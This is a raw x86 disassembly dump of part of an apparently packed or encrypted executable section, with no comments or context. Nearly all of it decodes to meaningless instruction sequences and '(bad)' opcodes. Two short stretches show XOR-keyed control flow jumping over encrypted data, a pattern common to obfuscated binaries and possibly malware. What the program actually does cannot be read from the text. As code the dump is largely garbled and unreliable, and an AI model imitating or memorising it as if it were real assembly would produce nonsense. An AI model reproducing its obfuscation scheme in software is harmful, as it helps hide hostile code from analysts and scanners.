  409e21:	inc    eax
  409e22:	ss xchg esi,eax
  409e24:	and    eax,DWORD PTR [edi-0x62c62da8]
  409e2a:	pop    ds
  409e2b:	mov    ecx,0xe3d5d861
  409e30:	test   eax,0x211ad893
  409e35:	iret   
  409e36:	mov    bh,0x94
  409e38:	jg     0x409df3
  409e3a:	dec    esp
  409e3b:	arpl   WORD PTR [edx+0x237a944b],ax
  409e41:	push   cs
  409e42:	mov    ah,0xf5
  409e44:	icebp  
  409e45:	es jmp 0x3905ca72
  409e4b:	arpl   WORD PTR [ebx-0xd],bp
  409e4e:	out    0xc7,al
  409e50:	mov    ch,0xb3
  409e52:	xchg   DWORD PTR [ebp+0x26],eax
  409e55:	repz jle 0x409e56
  409e58:	jmp    0x10764a55
  409e5d:	rol    DWORD PTR [edx],0xb4
  409e60:	fnstsw WORD PTR es:[ebp+0x1359bded]
  409e67:	mov    al,ds:0x9a79d848
  409e6c:	dec    edi
  409e6d:	pop    ecx
  409e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e6f:	dec    eax
  409e70:	loop   0x409df8
  409e72:	fs sti 
  409e74:	outs   dx,DWORD PTR ds:[esi]
  409e75:	and    ch,BYTE PTR [edi+edx*1+0x4b]
  409e79:	cmp    al,0x2a
  409e7b:	arpl   WORD PTR [edx],di
  409e7d:	ret    
  409e7e:	pusha  
  409e7f:	fistp  QWORD PTR [edx+edi*8]
  409e82:	push   ecx
  409e83:	cwde   
  409e84:	rcl    eax,1
  409e86:	dec    edx
  409e87:	bound  ecx,QWORD PTR [edi]
  409e89:	pop    ss
  409e8a:	fld    DWORD PTR [esi+0x64]
  409e8d:	das    
  409e8e:	std    
  409e8f:	push   esp
  409e90:	scas   eax,DWORD PTR es:[edi]
  409e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e92:	addr16 jmp 0x7228:0xfef8b40a
  409e9a:	mov    ch,0x81
  409e9c:	stos   DWORD PTR es:[edi],eax
  409e9d:	mov    cl,cl
  409e9f:	and    DWORD PTR [esi+edx*2],esp
  409ea2:	jo     0x409eea
  409ea4:	push   0xffffffb7
  409ea6:	stc    
  409ea7:	rcl    DWORD PTR [esi],0xed
  409eaa:	outs   dx,BYTE PTR ds:[esi]
  409eab:	sbb    dh,BYTE PTR [eax-0x763ea524]
  409eb1:	cli    
  409eb2:	fmul   st(5),st
  409eb4:	call   0x6ded:0x6287361f
  409ebb:	push   es
  409ebc:	xchg   ebp,eax
  409ebd:	push   ebp
  409ebe:	xchg   ebp,eax
  409ebf:	push   esi
  409ec0:	pop    eax
  409ec1:	dec    esp
  409ec2:	sbb    al,0x35
  409ec4:	enter  0x7f6,0x70
  409ec8:	sbb    ch,dh
  409eca:	stc    
  409ecb:	mov    edx,0x6ea8a42e
  409ed0:	ins    DWORD PTR es:[edi],dx
  409ed1:	jb     0x409f33
  409ed3:	fs mov bl,0xda
  409ed6:	jnp    0x409f16
  409ed8:	std    
  409ed9:	ror    DWORD PTR [ecx-0x13],1
  409edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409edd:	scas   al,BYTE PTR es:[edi]
  409ede:	pop    ebx
  409edf:	ins    BYTE PTR es:[edi],dx
  409ee0:	test   DWORD PTR [edi-0x40159d9a],eax
  409ee6:	xchg   ecx,eax
  409ee7:	jo     0x409e6f
  409ee9:	lahf   
  409eea:	fisttp QWORD PTR [edx+0x6dee39f]
  409ef0:	imul   ecx,DWORD PTR [edi+eax*8-0x52e79072],0xd4a189d4
  409efb:	adc    al,0xa2
  409efd:	mov    ecx,DWORD PTR [eax+edi*4+0x5a7d12d9]
  409f04:	adc    al,BYTE PTR [edx+edi*4]
  409f07:	jge    0x409eed
  409f09:	inc    ebp
  409f0a:	dec    esi
  409f0b:	cmp    DWORD PTR [esi-0x21],esi
  409f0e:	dec    ebx
  409f0f:	lods   eax,DWORD PTR ds:[esi]
  409f10:	sub    ebp,DWORD PTR [edi+0x1c]
  409f13:	jl     0x409f4f
  409f15:	jmp    0x65129c91
  409f1a:	retf   0xba83
  409f1d:	sub    al,0x7b
  409f1f:	hlt    
  409f20:	xor    al,0x18
  409f22:	dec    ecx
  409f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f24:	test   eax,0x49dc61b1
  409f29:	adc    BYTE PTR [ebx],dl
  409f2b:	(bad)  
  409f2c:	cmp    bl,cl
  409f2e:	in     eax,dx
  409f2f:	repz cli 
  409f31:	loope  0x409ef1
  409f33:	call   0x6602ec60
  409f38:	aaa    
  409f39:	cmc    
  409f3a:	add    bh,BYTE PTR [ebp+0x100d5c9e]
  409f40:	in     al,0x53
  409f42:	and    ah,BYTE PTR [edi+0x38]
  409f45:	sub    DWORD PTR ds:0x690a8f8b,edi
  409f4b:	pop    edi
  409f4c:	call   FWORD PTR [ebx+0x4cff8374]
  409f52:	adc    esp,DWORD PTR ds:0x53d4a45f
  409f58:	imul   eax,DWORD PTR [eax-0x3603316],0x252e6cf8
  409f62:	das    
  409f63:	pop    ss
  409f64:	ins    BYTE PTR es:[edi],dx
  409f65:	inc    eax
  409f66:	xchg   al,dh
  409f68:	pop    ss
  409f69:	fwait
  409f6a:	mov    ebx,0x651f69d1
  409f6f:	lahf   
  409f70:	mov    esp,0xf9bb2c72
  409f75:	mov    edi,0x2c4a1b2c
  409f7a:	jae    0x409f7d
  409f7c:	mov    eax,0x31478e59
  409f81:	retf   
  409f82:	pop    ecx
  409f83:	(bad)  [edi]
  409f85:	push   edi
  409f86:	sar    DWORD PTR [ebx],cl
  409f88:	ror    DWORD PTR [ebx+0x6],cl
  409f8b:	add    edx,DWORD PTR [edi]
  409f8d:	rcr    ebp,1
  409f8f:	mov    eax,0x54460f4f
  409f94:	mov    ebp,0x69f1aa25
  409f99:	out    0xea,eax
  409f9b:	cmp    eax,0xa0f297b0
  409fa0:	gs pop edx
  409fa2:	mov    edx,0xcd1abcf1
  409fa7:	and    al,0x32
  409fa9:	xchg   ecx,eax
  409faa:	jp     0x409ff3
  409fac:	fldenv [edx-0xba1257e]
  409fb2:	fistp  DWORD PTR [edx+0x20]
  409fb5:	sti    
  409fb6:	pop    ebp
  409fb7:	pop    es
  409fb8:	ins    BYTE PTR es:[edi],dx
  409fb9:	lods   al,BYTE PTR ds:[esi]
  409fba:	or     ebx,edi
  409fbc:	adc    cl,dl
  409fbe:	adc    DWORD PTR [eax-0x1e],eax
  409fc1:	cmp    DWORD PTR [ecx-0x37e9dee8],0x6d
  409fc8:	inc    esp
  409fc9:	ja     0x40a019
  409fcb:	rol    BYTE PTR [ecx+0x155691e2],cl
  409fd1:	pop    ecx
  409fd2:	pop    ebx
  409fd3:	js     0x40a004
  409fd5:	lds    esi,FWORD PTR [esi]
  409fd7:	fxch   st(3)
  409fd9:	ins    DWORD PTR es:[edi],dx
  409fda:	sub    al,0xfa
  409fdc:	mov    bl,0x3b
  409fde:	in     eax,0x44
  409fe0:	mov    esp,0x9d47fa03
  409fe5:	daa    
  409fe6:	sub    eax,0x19ecda27
  409feb:	aad    0xc0
  409fed:	mov    cl,0x9a
  409fef:	stc    
  409ff0:	ja     0x409f98
  409ff2:	mov    eax,0xfae96be8
  409ff7:	scas   al,BYTE PTR es:[edi]
  409ff8:	loopne 0x40a03b
  409ffa:	ins    BYTE PTR es:[edi],dx
  409ffb:	push   ecx
  409ffc:	mov    ebp,0x5ebb44d
  40a001:	(bad)  
  40a002:	(bad)  
  40a003:	pushf  
  40a004:	jle    0x409fad
  40a006:	out    0xf8,al
  40a008:	sub    BYTE PTR [ebx-0x39cc0fb3],cl
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x33]
  40a02a:	cmc    
  40a02b:	push   ebp
  40a02c:	mov    eax,0x7e7eee70
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	fs add eax,0xfc4f7c1f
  40a03b:	repz fcmove st,st(5)
  40a03e:	in     eax,0x54
  40a040:	daa    
  40a041:	int3   
  40a042:	xor    eax,0x20ecf6b8
  40a047:	sub    ch,0x46
  40a04a:	xchg   esp,eax
  40a04b:	nop
  40a04c:	add    eax,DWORD PTR [edx-0x52]
  40a04f:	dec    eax
  40a050:	int3   
  40a051:	shl    DWORD PTR [ebp-0x2f],1
  40a054:	inc    ebx
  40a055:	nop
  40a056:	call   0x2870:0x74d3ab34
  40a05d:	dec    esi
  40a05e:	stos   DWORD PTR es:[edi],eax
  40a05f:	jle    0x40a0b8
  40a061:	push   edx
  40a062:	add    eax,0x6a8728a0
  40a067:	pushf  
  40a068:	leave  
  40a069:	shl    BYTE PTR [edi-0x5001865],0xd
  40a070:	and    DWORD PTR [esp+eiz*2-0x854d4de],esp
  40a077:	sbb    ebp,edi
  40a079:	inc    eax
  40a07a:	icebp  
  40a07b:	xlat   BYTE PTR ds:[ebx]
  40a07c:	cld    
  40a07d:	ja     0x40a0c9
  40a07f:	cmc    
  40a080:	adc    ecx,ebp
  40a082:	loope  0x40a0fd
  40a084:	sbb    ebp,esi
  40a086:	push   ebx
  40a087:	pushf  
  40a088:	mov    WORD PTR [ebx+eiz*4],ds
  40a08b:	cdq    
  40a08c:	push   eax
  40a08d:	pushf  
  40a08e:	mov    eax,ds:0xeae8d370
  40a093:	aaa    
  40a094:	xchg   edi,eax
  40a095:	mov    eax,0x418d2661
  40a09a:	out    0xe9,eax
  40a09c:	jle    0x40a115
  40a09e:	xchg   ebp,eax
  40a09f:	push   ss
  40a0a0:	inc    edi
  40a0a1:	cmp    BYTE PTR [edx],dh
  40a0a3:	dec    eax
  40a0a4:	mov    al,0x48
  40a0a6:	sub    al,0xf4
  40a0a8:	xchg   esi,eax
  40a0a9:	gs push esi
  40a0ab:	lods   eax,DWORD PTR ds:[esi]
  40a0ac:	ret    
  40a0ad:	sbb    al,0xa3
  40a0af:	ja     0x40a0cb
  40a0b1:	call   0xf964:0x1e6d20ca
  40a0b8:	jno    0x40a0ba
  40a0ba:	cli    
  40a0bb:	aaa    
  40a0bc:	cmp    ebp,DWORD PTR fs:[esi+0x1c]
  40a0c0:	sub    eax,0xa
  40a0c3:	ins    DWORD PTR es:[edi],dx
  40a0c4:	mov    dh,BYTE PTR [ebp-0x46d85a67]
  40a0ca:	int3   
  40a0cb:	in     al,dx
  40a0cc:	or     BYTE PTR ss:[esi+0x3f66028f],bl
  40a0d3:	jle    0x40a135
  40a0d5:	jmp    0x40a11a
  40a0d7:	push   ebx
  40a0d8:	pop    edi
  40a0d9:	ds mov cl,0x5f
  40a0dd:	pop    esp
  40a0de:	mov    edx,DWORD PTR [edi+edx*1-0x69]
  40a0e2:	adc    eax,0x9e85f144
  40a0e7:	inc    esp
  40a0e8:	sahf   
  40a0e9:	jno    0x40a0e6
  40a0eb:	and    DWORD PTR [esi],ebx
  40a0ed:	popf   
  40a0ee:	inc    edi
  40a0ef:	pusha  
  40a0f0:	test   eax,0x7b1055ff
  40a0f5:	sbb    dl,dh
  40a0f7:	(bad)  
  40a0f8:	jge    0x40a0bc
  40a0fa:	or     al,0x81
  40a0fc:	cli    
  40a0fd:	(bad)  
  40a0fe:	mov    dh,0x6b
  40a100:	les    ebx,FWORD PTR [esi+0x31]
  40a103:	je     0x40a0fe
  40a105:	rol    cl,1
  40a107:	jne    0x40a16f
  40a109:	or     eax,0x29b69b58
  40a10e:	sar    DWORD PTR [edi-0x8698156],cl
  40a114:	in     eax,0x36
  40a116:	rcr    DWORD PTR [eax],cl
  40a118:	imul   esp,esp,0x2e7aad1c
  40a11e:	in     eax,dx
  40a11f:	dec    edx
  40a120:	inc    eax
  40a121:	add    eax,0xadb74060
  40a126:	neg    BYTE PTR [edi-0x26fcb7a3]
  40a12c:	shr    DWORD PTR [ebx-0x2b],1
  40a12f:	in     al,dx
  40a130:	xor    al,0x48
  40a132:	adc    ecx,edx
  40a134:	jmp    0x1e92ca28
  40a139:	repnz dec eax
  40a13b:	daa    
  40a13c:	sub    BYTE PTR [ecx+esi*1-0x40],ch
  40a140:	push   ds
  40a141:	daa    
  40a142:	mov    edi,0x7de6e32d
  40a147:	jg     0x40a196
  40a149:	adc    ecx,edx
  40a14b:	inc    ebx
  40a14c:	pop    ebp
  40a14d:	ret    0xf3cf
  40a150:	push   edx
  40a151:	sub    al,0x6
  40a153:	daa    
  40a154:	rcr    DWORD PTR [ecx+0x71],cl
  40a157:	mov    bh,0x5a
  40a159:	xchg   DWORD PTR [edx+0x4fa993c0],esi
  40a15f:	and    BYTE PTR [edx],ch
  40a161:	cmp    al,0x4a
  40a163:	stos   BYTE PTR es:[edi],al
  40a164:	aas    
  40a165:	xchg   ebp,eax
  40a166:	mul    BYTE PTR [ecx]
  40a168:	jecxz  0x40a0ea
  40a16a:	mov    ebp,0x7cca020c
  40a16f:	push   ebp
  40a170:	jo     0x40a1b5
  40a172:	daa    
  40a173:	and    BYTE PTR [esi+eiz*8+0x6b],cl
  40a177:	add    DWORD PTR [ebx+0x635c8fa8],edi
  40a17d:	fbstp  TBYTE PTR [ebp-0x38ca738a]
  40a183:	sti    
  40a184:	imul   eax,DWORD PTR [edi-0x60],0x6b
  40a188:	mov    bh,BYTE PTR [eax+0x25]
  40a18b:	(bad)  
  40a18c:	pop    eax
  40a18d:	sub    eax,0x81b31ee6
  40a192:	push   edx
  40a193:	xchg   edx,eax
  40a194:	loope  0x40a1e2
  40a196:	je     0x40a1a9
  40a198:	add    BYTE PTR [ecx+0x47],dh
  40a19b:	out    0xd8,al
  40a19d:	dec    ebx
  40a19e:	push   cs
  40a19f:	dec    edx
  40a1a0:	xchg   DWORD PTR [ebx+0x2b],ecx
  40a1a3:	fdiv   DWORD PTR [ebp-0x70]
  40a1a6:	(bad)  
  40a1a8:	jb     0x40a12a
  40a1aa:	sbb    esp,eax
  40a1ac:	add    ebp,0x606d3d38
  40a1b2:	add    DWORD PTR [edi+esi*2+0x1c6b584c],esp
  40a1b9:	in     eax,dx
  40a1ba:	xchg   edi,eax
  40a1bb:	or     ah,BYTE PTR [esi+0x25116848]
  40a1c1:	xchg   edx,ecx
  40a1c3:	call   0xbc9f:0xec8c6178
  40a1ca:	dec    edx
  40a1cb:	mov    cl,0xb8
  40a1cd:	lahf   
  40a1ce:	push   eax
  40a1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d0:	sub    bl,BYTE PTR [ebx-0x42f230f0]
  40a1d6:	js     0x40a1bd
  40a1d8:	push   ss
  40a1d9:	xchg   BYTE PTR ds:0xbe040d13,dh
  40a1df:	cmp    esi,eax
  40a1e1:	outs   dx,BYTE PTR ds:[esi]
  40a1e2:	rcpps  xmm7,xmm1
  40a1e5:	outs   dx,DWORD PTR ds:[esi]
  40a1e6:	int    0x91
  40a1e8:	dec    eax
  40a1e9:	daa    
  40a1ea:	ins    DWORD PTR es:[edi],dx
  40a1eb:	shl    BYTE PTR [esi+ebp*1-0xc],0x81
  40a1f0:	inc    BYTE PTR [esp+edx*2-0x17]
  40a1f4:	jmp    0x40a257
  40a1f6:	add    ebx,esi
  40a1f8:	inc    esp
  40a1f9:	cdq    
  40a1fa:	inc    ebp
  40a1fb:	(bad)  
  40a1fc:	push   cs
  40a1fd:	pop    si
  40a1ff:	and    DWORD PTR [ebx-0x23],0xffffff9d
  40a203:	ret    
  40a204:	mov    al,0xbc
  40a206:	cmc    
  40a207:	push   ecx
  40a208:	mov    ecx,0xab4d6657
  40a20d:	leave  
  40a20e:	imul   esi,DWORD PTR [eax+0x503dbb26],0x20d2d4c6
  40a218:	mov    WORD PTR [edx-0x6107242],fs
  40a21e:	inc    ebx
  40a21f:	pop    eax
  40a220:	inc    esi
  40a221:	fwait
  40a222:	mov    ecx,0x62bfce80
  40a227:	ja     0x40a20b
  40a229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22a:	rcr    ebp,1
  40a22c:	and    eax,0xa08b2056
  40a231:	mov    eax,DWORD PTR [esi-0x2515a707]
  40a237:	aaa    
  40a238:	lds    eax,FWORD PTR [edx-0x23]
  40a23b:	add    eax,0x7dd03103
  40a240:	shl    BYTE PTR [eax+0x68727db6],cl
  40a246:	iret   
  40a247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a248:	cli    
  40a249:	jno    0x40a256
  40a24b:	bound  edi,QWORD PTR [edi+0x15]
  40a24e:	mov    al,ds:0x78fb7902
  40a253:	sbb    eax,0xcfd9c8df
  40a258:	gs mov edx,0x3d3c0d1c
  40a25e:	mov    bl,cl
  40a260:	pop    es
  40a261:	xor    esp,ecx
  40a263:	jecxz  0x40a26d
  40a265:	popa   
  40a266:	sub    BYTE PTR [edi],dh
  40a268:	call   0x305d925d
  40a26d:	mov    eax,ds:0x5de52fb2
  40a272:	fadd   DWORD PTR [esi+0x6aa1a2a6]
  40a278:	mov    edi,0x536b2669
  40a27d:	adc    DWORD PTR [edi-0x74e7e4ed],eax
  40a283:	aas    
  40a284:	shl    DWORD PTR [edx+0x8],cl
  40a287:	mov    bh,0x12
  40a289:	push   ds
  40a28a:	(bad)  [ebp-0x65d8f7f0]
  40a290:	lock jne 0x40a290
  40a293:	in     al,dx
  40a294:	imul   eax,ecx,0x6e
  40a297:	mov    BYTE PTR [ebx],al
  40a299:	scas   eax,DWORD PTR es:[edi]
  40a29a:	ja     0x40a277
  40a29c:	mov    bh,0xa0
  40a29e:	rcl    BYTE PTR [ebp+0x4e],1
  40a2a1:	sti    
  40a2a2:	dec    ecx
  40a2a3:	ins    DWORD PTR es:[edi],dx
  40a2a4:	js     0x40a2d4
  40a2a6:	cdq    
  40a2a7:	mov    bh,0x1c
  40a2a9:	cli    
  40a2aa:	pop    eax
  40a2ab:	cmp    eax,0x4381b2fc
  40a2b0:	ja     0x40a2fb
  40a2b2:	imul   DWORD PTR [esi-0x708ee467]
  40a2b8:	hlt    
  40a2b9:	ins    BYTE PTR es:[edi],dx
  40a2ba:	cmp    ah,dl
  40a2bc:	imul   ecx,esi,0x6797baac
  40a2c2:	sti    
  40a2c3:	jmp    0x40a2a0
  40a2c5:	adc    edx,DWORD PTR [ecx]
  40a2c7:	inc    ebp
  40a2c8:	sbb    ebp,DWORD PTR [edi-0x3d]
  40a2cb:	adc    ah,BYTE PTR [esi]
  40a2cd:	fstp   QWORD PTR [edi]
  40a2cf:	aas    
  40a2d0:	(bad)  
  40a2d1:	int    0xca
  40a2d3:	ds scas al,BYTE PTR es:[edi]
  40a2d5:	inc    ebp
  40a2d6:	jl     0x40a25e
  40a2d8:	add    ebp,ebx
  40a2da:	call   0x67375eb4
  40a2df:	iret   
  40a2e0:	jg     0x40a264
  40a2e2:	sub    BYTE PTR [edi],dh
  40a2e4:	stos   BYTE PTR es:[edi],al
  40a2e5:	pop    edx
  40a2e6:	lods   al,BYTE PTR ds:[esi]
  40a2e7:	in     al,0x84
  40a2e9:	jmp    0xa9cb1c25
  40a2ee:	mov    DWORD PTR [ebx+0x3964d7da],ecx
  40a2f4:	pop    ss
  40a2f5:	inc    eax
  40a2f6:	or     esp,ebp
  40a2f8:	mov    ds:0x30d86f25,al
  40a2fd:	add    al,0x4d
  40a2ff:	mov    al,0x9e
  40a301:	out    0xf,al
  40a303:	inc    edx
  40a304:	(bad)  
  40a305:	sbb    al,0xc4
  40a307:	jb     0x40a2e2
  40a309:	mov    ecx,0xac510ac4
  40a30e:	outs   dx,BYTE PTR ds:[esi]
  40a30f:	adc    dh,dh
  40a311:	stc    
  40a312:	imul   esi,DWORD PTR [ebx-0x32b1a090],0x1dbbcfc
  40a31c:	pushf  
  40a31d:	ret    
  40a31e:	cmp    bh,BYTE PTR [ebp+0x5a3ee200]
  40a324:	int3   
  40a325:	push   ebp
  40a326:	dec    esi
  40a327:	arpl   WORD PTR [edi+ecx*2-0x299e541f],bp
  40a32e:	rcl    DWORD PTR [edx],1
  40a330:	dec    esi
  40a331:	lahf   
  40a332:	push   esp
  40a333:	stc    
  40a334:	push   es
  40a335:	pusha  
  40a336:	xor    BYTE PTR [esi+eax*4],cl
  40a339:	xor    ecx,esi
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	adc    bh,BYTE PTR ds:0xea7cde52
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	adc    al,0x6a
  40a3d9:	bound  eax,QWORD PTR [edi]
  40a3db:	xacquire xchg DWORD PTR [ecx+0x39d5dd0f],edx
  40a3e2:	(bad)  
  40a3e3:	pop    esp
  40a3e4:	add    al,0x5e
  40a3e6:	jp     0x40a38e
  40a3e8:	push   0x946ab7a0
  40a3ed:	sub    ch,dh
  40a3ef:	mov    DWORD PTR [edi+0xb250cbf],ebx
  40a3f5:	adc    BYTE PTR cs:[esi],dl
  40a3f8:	sub    BYTE PTR [ebp+0x5f46a590],ah
  40a3fe:	mov    gs,WORD PTR [esi]
  40a400:	pushw  0x72bc
  40a404:	add    al,0x11
  40a406:	int3   
  40a407:	test   BYTE PTR [edx+ebx*1+0x37f10c06],0xad
  40a40f:	xchg   DWORD PTR [edi+0x259faabe],eax
  40a415:	cmc    
  40a416:	push   esp
  40a417:	outs   dx,DWORD PTR ds:[esi]
  40a418:	fs add esi,ebx
  40a41b:	push   ebp
  40a41c:	xchg   edx,eax
  40a41d:	mov    DWORD PTR [ebx+0x22],ecx
  40a420:	push   ss
  40a421:	js     0x40a483
  40a423:	xor    dh,bh
  40a425:	inc    ebx
  40a426:	rcl    esp,1
  40a428:	in     eax,dx
  40a429:	sub    al,0x2a
  40a42b:	call   0x1aba:0xd0e42142
  40a432:	loopne 0x40a3cb
  40a434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a435:	sub    BYTE PTR [esi+0x73],cl
  40a438:	and    cl,bl
  40a43a:	or     DWORD PTR [esi+0x7b628dd8],ebx
  40a440:	lods   al,BYTE PTR ds:[esi]
  40a441:	(bad)  
  40a442:	mov    WORD PTR [edi+0x33],fs
  40a445:	(bad)  
  40a446:	jmp    0x40a42e
  40a448:	ins    DWORD PTR es:[edi],dx
  40a449:	sub    BYTE PTR [ebp-0x585a9d59],cl
  40a44f:	push   ss
  40a450:	cli    
  40a451:	push   0xf0846b91
  40a456:	add    ebp,DWORD PTR [edx+0x1b]
  40a459:	inc    esp
  40a45a:	jb     0x40a3dc
  40a45c:	jns    0x40a42a
  40a45e:	add    al,0x23
  40a460:	jns    0x40a43f
  40a462:	xor    al,0x3b
  40a464:	add    al,0xe
  40a466:	ret    0x4a11
  40a469:	aas    
  40a46a:	out    dx,al
  40a46b:	in     ax,0x9c
  40a46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a46f:	adc    ecx,DWORD PTR [esi]
  40a471:	jp     0x40a44f
  40a473:	pop    ss
  40a474:	jae    0x40a460
  40a476:	pop    esi
  40a477:	les    esp,FWORD PTR [ecx+0x67085800]
  40a47d:	inc    ecx
  40a47e:	jmp    0x9460:0x738eba96
  40a485:	add    dh,dl
  40a487:	xchg   BYTE PTR [esi+0x50],bh
  40a48a:	inc    ebp
  40a48b:	or     ebp,DWORD PTR [edi]
  40a48d:	pop    ds
  40a48e:	mov    ebx,0x55d197b9
  40a493:	push   ds
  40a494:	cmc    
  40a495:	dec    eax
  40a496:	xor    DWORD PTR [eax-0x72f2c8e8],ebx
  40a49c:	pop    ds
  40a49d:	popa   
  40a49e:	in     al,dx
  40a49f:	aas    
  40a4a0:	stc    
  40a4a1:	jno    0x40a4fa
  40a4a3:	push   cs
  40a4a4:	lock imul ebx,DWORD PTR [ebp+0x3f0306d7],0xe5984a40
  40a4af:	xchg   edi,eax
  40a4b0:	scas   al,BYTE PTR es:[edi]
  40a4b1:	jnp    0x40a4aa
  40a4b3:	inc    eax
  40a4b4:	jmp    0x40a44e
  40a4b6:	mov    ecx,0xff90a24e
  40a4bb:	dec    eax
  40a4bc:	ja     0x40a50f
  40a4be:	in     eax,0xa8
  40a4c0:	add    ch,BYTE PTR [esi]
  40a4c2:	xor    eax,ecx
  40a4c4:	and    DWORD PTR [eax],ebp
  40a4c6:	xchg   edx,eax
  40a4c7:	jns    0x40a475
  40a4c9:	(bad)  
  40a4ca:	ins    BYTE PTR es:[edi],dx
  40a4cb:	jnp    0x40a469
  40a4cd:	fsub   QWORD PTR [esi+ebx*8-0x5740075e]
  40a4d4:	xor    al,0xb4
  40a4d6:	hlt    
  40a4d7:	mov    ds:0x8575cac2,eax
  40a4dc:	jmp    0x40a4f5
  40a4de:	imul   esp,DWORD PTR [ebx-0x7d],0x2c0c6c8f
  40a4e5:	adc    DWORD PTR [ebx+0x42f9e483],ecx
  40a4eb:	mov    ds:0x872307c,eax
  40a4f0:	popa   
  40a4f1:	push   edx
  40a4f2:	out    dx,eax
  40a4f3:	pop    ss
  40a4f4:	pusha  
  40a4f5:	dec    ecx
  40a4f6:	dec    edi
  40a4f7:	fdivr  QWORD PTR [edx]
  40a4f9:	cmp    esp,ebp
  40a4fb:	inc    edx
  40a4fc:	sbb    eax,0xafb77b02
  40a501:	xchg   edi,eax
  40a502:	rol    esi,1
  40a504:	out    0x2e,al
  40a506:	and    eax,0xf6eb1964
  40a50b:	and    DWORD PTR [esi],ecx
  40a50d:	std    
  40a50e:	xchg   DWORD PTR [esi],edi
  40a510:	dec    edi
  40a511:	ds adc cl,cl
  40a514:	rcr    DWORD PTR [esi+edx*1],cl
  40a517:	addr16 popf 
  40a519:	inc    esp
  40a51a:	xor    al,0xf1
  40a51c:	sbb    eax,0x19c60c97
  40a521:	stos   DWORD PTR es:[edi],eax
  40a522:	(bad)  
  40a523:	jg     0x40a4fe
  40a525:	in     eax,dx
  40a526:	adc    dl,BYTE PTR [edi+0xe]
  40a529:	inc    esi
  40a52a:	in     eax,dx
  40a52b:	(bad)  
  40a52c:	mov    bl,0x97
  40a52e:	rcl    ebp,0xce
  40a531:	or     ecx,edi
  40a533:	pusha  
  40a534:	or     ch,bl
  40a536:	sbb    eax,0x2811a063
  40a53b:	imul   edi,DWORD PTR [esi],0xad9bed5b
  40a541:	std    
  40a542:	xchg   ebp,eax
  40a543:	cld    
  40a544:	inc    edx
  40a545:	fdivr  DWORD PTR [ecx]
  40a547:	cmp    ebp,DWORD PTR [ebx+0x4b]
  40a54a:	fwait
  40a54b:	adc    al,0xc6
  40a54d:	add    eax,0xd622914
  40a552:	mov    al,ds:0xc03d7fb9
  40a557:	sahf   
  40a558:	mov    esi,ecx
  40a55a:	add    eax,0xe6c7eb2b
  40a55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a560:	sub    BYTE PTR [esi+0x3cd05407],0x25
  40a567:	jo     0x40a525
  40a569:	in     eax,0xd9
  40a56b:	aaa    
  40a56c:	sbb    edi,DWORD PTR [edx]
  40a56e:	push   ds
  40a56f:	push   esp
  40a570:	dec    eax
  40a571:	and    WORD PTR [edi+0x30],cx
  40a575:	inc    esp
  40a576:	les    esp,FWORD PTR [edx-0x2dd1556e]
  40a57c:	mov    al,ds:0x73f8c124
  40a582:	mov    ebp,0xfc6b467c
  40a587:	rcl    al,1
  40a589:	mov    ebx,esp
  40a58b:	leave  
  40a58c:	test   eax,0xe175f23a
  40a591:	(bad)  
  40a593:	dec    edx
  40a594:	push   cs
  40a595:	and    ch,dl
  40a597:	outs   dx,BYTE PTR ds:[esi]
  40a598:	mov    dh,0x1b
  40a59a:	das    
  40a59b:	mov    edi,0x7b2a2f62
  40a5a0:	cmp    DWORD PTR [ebx-0x42],eax
  40a5a3:	fcom   DWORD PTR [ebx-0x102c9c36]
